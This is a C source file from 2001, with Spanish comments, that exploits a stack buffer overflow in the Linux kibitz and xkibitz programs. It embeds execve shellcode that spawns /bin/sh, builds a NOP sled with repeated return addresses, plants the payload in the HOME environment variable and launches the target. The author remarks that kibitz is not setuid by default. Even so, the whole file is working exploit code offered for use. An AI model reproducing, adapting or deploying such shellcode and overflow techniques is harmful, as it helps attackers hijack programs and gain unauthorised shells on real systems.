/* 
 * /usr/bin/kibitz   Linux i386 xploit  -=*=-  13/03/2001  
 * /usr/bin/xkibitz  Linux i386 xploit 
 *
 * by Lykeios (lykeios@bigfoot.com)  
 * http://www.bigfoot.com/~lykeios
 *      
 * (x)kibitz NO es setuid por defecto (no deberia serlo nunca ;] ),
 * asi que esto no te va a servir de nada. Encontre el overflow por casualidad
 * y codee el xploit en un momento. Nada mas. Simple diversion ;]
 *
 * Uso: ./kibitz_xp (1/2) [offset]  (default offset = 800, prueba: 700-1200)
 * 
 *      1 - /usr/bin/kibitz
 *      2 - /usr/bin/xkibitz
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

char shellcode[] =
/* Aleph One */
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

#define NOP 		0x90
#define BUFSIZE		501
#define OFFSET          800 

long get_esp(void) {
   __asm__(" movl %esp, %eax ");
}

int main(int argc, char * argv[]) {

	char  buffer[BUFSIZE];
	long ret;
	int i, off = OFFSET;
	
	if (argc < 2) {
		printf("Uso: %s (1/2) [offset]  (default offset = 750, prueba: 700-1200)\n",argv[0]);
                printf("1 - /usr/bin/kibtiz\n2 - /usr/bin/xkibitz\n");
		return -1;
	}
			 
	if (argc > 2)
		off = atoi(argv[2]);	
	
	ret = get_esp() + off;

	memset(buffer, NOP, BUFSIZE-strlen(shellcode)-100-1);
	strncpy(buffer +BUFSIZE-strlen(shellcode)-100-1, shellcode, strlen(shellcode));	
	
	for(i=BUFSIZE-100-1; i<BUFSIZE-1; i+=4)
		*(int*)&buffer[i] = ret;
		
	buffer[BUFSIZE-1]='\0';
	
	setenv("HOME", buffer, 1);
	
	printf("Usando ret: 0x%x\nUsando off: 0x%x\n", ret, off);
	if (atoi(argv[1]) == 1) 
		execl("/usr/bin/kibitz", "/usr/bin/kibitz", NULL);	
	else if (atoi(argv[1]) == 2)
		execl("/usr/bin/xkibitz", "/usr/bin/xkibitz", NULL);
        else
                printf("Vamos a ver... tu que quieres xplotar? ;]\n");
}



